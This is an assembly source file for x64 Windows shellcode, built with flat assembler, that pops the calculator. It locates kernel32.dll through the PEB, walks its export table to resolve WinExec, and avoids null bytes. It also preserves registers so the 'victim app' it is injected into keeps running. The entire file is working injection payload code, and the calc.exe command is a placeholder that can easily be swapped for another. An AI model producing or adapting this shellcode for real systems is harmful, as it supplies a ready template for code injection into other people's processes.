;compiled this with flat assembler
;x64 shellcode to pop Calc.exe
format PE64 console
use64
entry start



winexec2:
        pop rsi
        jmp looop

start:


       ;;;sub rsp,28h      ;32 bytes for shadowspace(4 registers) for the callee and 8bytes
                         ;for 16 byte allignment as pushing return address messed the stack by 8byte
       ;;;align and initialize stack
       ;;;and rsp, 0fffffffffffffff0h

                          ;but we do need to save registers state for our victim app to not crash
                          ;it looks like we dont need to use rbp or even a frame
        push rax          ;we can just use non-volatile(static throughout win32 api calls) registers
        push rbx          ;namely rdi rsi rbp rbx r12-15
        push rcx          ;but still we can use the rbp frame based
        push rdx          
        push rdi          ;and also for strings we just used the call-pop sequence
        push rsi          
        push rbp
        push rsp
        push r8
        push r9
        push r10
        push r11
        push r12
        push r13
        push r14
        push r15
        push r15         ;for alignment since ret address' pushed
       ;;; mov rbp,rsp
       ;;; sub rsp,70h
        sub rsp,20h
       
       
       
       ;now find kernel32.dll's base
        xor rbx, rbx
        mov r12, [gs:rbx+60h]
        mov r12, [r12+18h]
        mov rsi, [r12+20h]
        lodsq
        xchg rax, rsi
        lodsq
        mov r15, [rax+20h]


       ;now parse kernel32.dll
        xor r12, r12
        xor rdi, rdi
        add rdi, 44h
        add rdi, 44h
        mov r12d, [r15+3ch]
        add r12, r15
        xor r14, r14
        mov r14d, [r12+rdi]    ;export table
        add r14, r15
        xor r12, r12
        mov r12d, [r14+20h]    ;name
        add r12, r15

getstr1:
        jmp winexec            ;rsi == str
looop:
        xor rdi, rdi
        mov edi, [r12+rbx*4]
        add rdi, r15
        cmpsq
        jz found
        inc rbx
        sub rsi, 8
        jmp looop

found:
        xor rsi, rsi
        xor rdi, rdi
        mov esi, [r14+24h]
        add rsi, r15
        mov di, [rsi+rbx*2]     ;di = ordinal table
        xor rsi, rsi
        mov esi, [r14+1ch]      ;address table
        add rsi, r15
        xor r14, r14
        mov r14d, [rsi+4*rdi]   ;address rva
        add r14, r15

        jmp pathh


getstr2:
       
       ;calling WinExec(calc.exe, 10)
        pop rcx
        xor rdx, rdx
        add rdx, 10
        sub rsp, 20h
        call r14
        add rsp, 20h
        jmp finishh



pathh:                                          ;call backwards to avoid null
        call getstr2
        db 'C:\Windows\System32\calc.exe', 0h

winexec:
        call winexec2
        db 'WinExec', 0h




finishh:
        add rsp, 20h
        pop r15
        pop r15
         pop r14
          pop r13
           pop r12
            pop r11
             pop r10
              pop r9
               pop r8
                pop rsp
                 pop rbp
                  pop rsi
                   pop rdi
                    pop rdx
                     pop rcx
                      pop rbx
                       pop rax
                       ret
